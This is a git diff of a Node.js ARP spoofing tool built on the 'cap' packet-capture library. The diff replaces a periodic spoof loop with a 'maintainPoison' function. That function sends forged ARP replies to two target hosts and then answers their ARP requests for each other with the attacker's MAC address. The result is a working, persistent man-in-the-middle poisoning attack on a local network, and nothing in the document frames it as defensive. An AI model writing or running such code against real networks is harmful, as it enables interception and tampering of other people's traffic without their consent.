@@ -19,34 +19,21 @@ var Cap = require('cap').Cap,
   };
 
 var target1 = { ip: null, mac: null },
-  target2 = { ip: null, mac: null },
-  interval = null;
+  target2 = { ip: null, mac: null };
 var targets = [target1, target2]
-if(process.argv.length > 1) {
+if(process.argv.length > 2) {
   target1.ip = process.argv[2];
   target2.ip = process.argv[3];
-  if(typeof process.argv[4] !== "undefined") {
-    interval = parseInt(process.argv[4]) * 1000;
-  }
 }
+
+console.log("WARNING: If IP forwarding is not enabled, targets may see a loss in connectivity");
 
 Q.nfcall(findOurHardwareAddress)
   .then(findTargetHardwareAddresses)
   .then(function() {
     if(target1.mac !== null && target2.mac !== null) {
-      console.log("\nSending single pair of ARP replies");
-      spoofBothWays(target1, target2, attacker.mac);
-
-      if(interval !== null) {
-        console.log("\nSending additional ARP replies every " + interval + " milliseconds");
-        setInterval(spoofBothWays, interval, target1, target2);
-      }
-
-      if(interval === null) {
-        process.exit();
-      } else {
-        // Stick around for the interval
-      }
+      console.log("\nResponding to all requests for " + target1.ip + " and " + target2.ip + " with " + attacker.mac);
+      maintainPoison(target1, target2);
     }
   });
 
@@ -77,13 +64,9 @@ function findTargetHardwareAddresses(next) {
   return deferred.promise;
 };
 
-var spoofBothWays = (target1, target2) => {
-  spoof(target1, target2);
-  spoof(target2, target1);
-};
-
-var spoof = function (src, dst, mac) {
-  // Send reply from target1 to broadcast, advertising new hardware address
+var createSpoofPacket = function (src, dst, buf) {
+  // Send reply from target1 to broadcast, advertising new hardware address.
+  // If buf == true, just returns a fully-formed packet, without sending it out
   var packet = createARPPacket();
 
   packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);
@@ -97,7 +80,52 @@ var spoof = function (src, dst, mac) {
   setIP(packet.arp.sender_ip, src.ip);
   setIP(packet.arp.target_ip, dst.ip);
 
-  send(packet.buffer);
+
+  return packet.buffer;
+};
+
+var maintainPoison = function(target1, target2) {
+  console.log("Starting poison...");
+  var c = new Cap();
+
+  c.open(device, filter, bufSize, socketBuffer);
+  c.setMinBytes && c.setMinBytes(42); // Length of an ARP packet
+
+  var spoofmsg1 = createSpoofPacket(target1, target2, true);
+  var spoofmsg2 = createSpoofPacket(target2, target1, true);
+
+  c.send(spoofmsg1);
+  c.send(spoofmsg2);
+
+  c.on("packet", (nbytes) => {
+    var response = createARPPacket(socketBuffer.slice(0, nbytes));
+
+    if(response.arp.operation.readInt16BE(0) === OPERATION.REQUEST) {
+      var request = {
+        requestedIp: buf2ipString(response.arp.target_ip),
+        senderMac: buf2macString(response.arp.sender_mac),
+        senderIp: buf2ipString(response.arp.sender_ip)
+      };
+
+      console.log(request.requestedIp + " requested by " + request.senderMac);
+      if ((request.requestedIp === target1.ip && request.senderMac === target2.mac) || (request.requestedIp === target2.ip && request.senderMac === target1.mac)) {
+        console.log(request.requestedIp + " identified as target, sending reply...");
+
+        response.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);
+
+        setMac(response.arp.target_mac, request.senderMac);
+        setMac(response.eth.target_mac, request.senderMac);
+
+        setMac(response.arp.sender_mac, attacker.mac);
+        setMac(response.eth.sender_mac, attacker.mac);
+
+        setIP(response.arp.target_ip, request.senderIp);
+        setIP(response.arp.sender_ip, request.requestedIp);
+
+        c.send(response.buffer, response.buffer.length);
+      }
+    }
+  });
 };
 
 var arpRequest = function(target, next) {
@@ -128,8 +156,8 @@ var arpRequest = function(target, next) {
       var senderIp = buf2ipString(response.arp.sender_ip);
 
       if(typeof mac !== "undefined" && senderIp === target.ip) {
-        next(mac);
         c.close();
+        next(mac);
 
         console.log(target.ip,"found at", mac);
       }
